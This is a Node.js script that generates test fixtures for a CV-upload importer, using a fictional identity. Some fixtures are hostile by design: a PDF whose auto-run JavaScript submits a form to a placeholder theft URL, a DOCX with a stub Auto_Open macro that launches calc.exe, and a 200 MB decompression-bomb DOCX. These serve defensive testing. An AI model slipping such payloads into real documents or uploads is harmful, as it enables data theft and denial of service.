#!/usr/bin/env node
// Génère les fichiers d'essai de l'import de CV (identité fictive, aucune donnée réelle).
//   node tests/extract/make-fixtures.mjs        (recette en marche : le PDF texte est compilé par latex-runner)
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import JSZip from 'jszip';
import { PDFDocument, StandardFonts } from 'pdf-lib';
import { Document, Packer, Paragraph, TextRun, HeadingLevel } from 'docx';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..', '..');
const OUT = path.join(ROOT, 'tests', 'extract', 'fixtures');
fs.mkdirSync(OUT, { recursive: true });
const write = (name, data) => { fs.writeFileSync(path.join(OUT, name), data); console.log(`${name} : ${Buffer.byteLength(data)} octets`); };

const CV_TEXT = `Awa Konan
Data Analyst – Santé publique
Abidjan, Côte d'Ivoire · awa.konan@exemple.ci

Expérience
Data Analyst — Institut fictif de santé (2023 – aujourd'hui)
• Tableaux de bord Power BI pour 12 districts sanitaires
• Automatisation des rapports hebdomadaires (Python, SQL)

Formation
Master Big Data — Université fictive (2022)

Compétences
Python, SQL, Power BI, statistiques

Langues
Français (natif), Anglais (C1)`;

// 1. PDF avec couche texte, compilé par la vraie chaîne (API → latex-runner)
const tex = fs.readFileSync(path.join(ROOT, 'tests', 'latex', 'fixtures', 'groq-generate-moderne.tex'), 'utf8').replace('%%PHOTO%%', '');
const res = await fetch('http://127.0.0.1:5000/api/cv/compile', { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Forwarded-For': '198.18.250.1' }, body: JSON.stringify({ code: tex }) });
if (!res.ok) throw new Error(`compilation du PDF d'essai : HTTP ${res.status}`);
write('cv-texte.pdf', Buffer.from(await res.arrayBuffer()));

// 2. PDF scanné : une image, aucune couche texte
const scan = await PDFDocument.create();
const jpg = await scan.embedJpg(fs.readFileSync(path.join(ROOT, 'tests', 'latex', 'fixtures', 'photo-test.jpg')));
scan.addPage([595, 842]).drawImage(jpg, { x: 100, y: 300, width: 350, height: 450 });
write('cv-scanne.pdf', Buffer.from(await scan.save()));

// 3. PDF contenant du JavaScript (ouverture automatique) : le texte doit être lu, le script jamais exécuté
const js = await PDFDocument.create();
const font = await js.embedFont(StandardFonts.Helvetica);
js.addPage([595, 842]).drawText('CV avec script : Awa Konan, Data Analyst', { x: 50, y: 780, size: 12, font });
js.addJavaScript('ouverture', 'app.alert("script exécuté"); this.submitForm("https://exemple.invalide/vol");');
write('cv-javascript.pdf', Buffer.from(await js.save()));

// 4. PDF corrompu
write('corrompu.pdf', Buffer.from('%PDF-1.7\n1 0 obj << /Type /Catalog /Pages 2 0 R >>\nendobj\nxref garbage\n%%EOF\n'));

// 5. DOCX (Word)
const lines = CV_TEXT.split('\n');
const docx = new Document({ sections: [{ children: lines.map((l, i) => new Paragraph(i === 0 ? { text: l, heading: HeadingLevel.TITLE } : { children: [new TextRun(l)] })) }] });
const docxBytes = await Packer.toBuffer(docx);
write('cv.docx', docxBytes);

// 6. DOCX à macros (.docm renommé)
const macro = await JSZip.loadAsync(docxBytes);
macro.file('word/vbaProject.bin', Buffer.from('ATTRIBUT Auto_Open\nShell "calc.exe"'));
write('cv-macro.docx', await macro.generateAsync({ type: 'nodebuffer', compression: 'DEFLATE' }));

// 7. Bombe de décompression : 200 Mo de zéros compressés en quelques centaines de Ko
const bomb = await JSZip.loadAsync(docxBytes);
bomb.file('word/media/bombe.bin', Buffer.alloc(200 * 1024 * 1024), { compression: 'DEFLATE', compressionOptions: { level: 9 } });
write('bombe.docx', await bomb.generateAsync({ type: 'nodebuffer', compression: 'DEFLATE' }));

// 8. Texte brut : UTF-8 et Windows-1252
write('cv.txt', Buffer.from(CV_TEXT, 'utf8'));
write('cv-windows-1252.txt', Buffer.from(CV_TEXT.replace(/[–—·•’]/g, '-'), 'latin1'));

// 9. RTF : accents codés, Unicode, police, image hexadécimale, métadonnées et lien ignorés
write('cv.rtf', Buffer.from([
  '{\\rtf1\\ansi\\ansicpg1252\\deff0{\\fonttbl{\\f0 Calibri;}}{\\colortbl;\\red0\\green0\\blue0;}',
  '{\\*\\generator Traitement de texte fictif;}{\\info{\\author Ne pas extraire}}',
  '\\f0\\fs22 Awa Konan\\par Data Analyst \\endash  Sant\\\'e9 publique\\par',
  'Abidjan, C\\\'f4te d\\rquote Ivoire\\par',
  '{\\pict\\pngblip 89504e470d0a1a0a0000000d49484452}',
  'Exp\\u233?rience : Institut fictif (2023)\\par',
  '\\bullet  Tableaux de bord pour 12 districts\\par',
  '{\\field{\\*\\fldinst HYPERLINK "https://exemple.invalide/piste"}{\\fldrslt Portfolio}}\\par',
  '{\\object\\objemb{\\*\\objdata 01050000020000000b0000004571756174696f6e}}',
  '}',
].join('\n'), 'latin1'));

// 10. Image (pour la lecture par l'IA, côté navigateur)
fs.copyFileSync(path.join(ROOT, 'tests', 'latex', 'fixtures', 'photo-test.jpg'), path.join(OUT, 'cv-image.jpg'));
console.log('Terminé.');
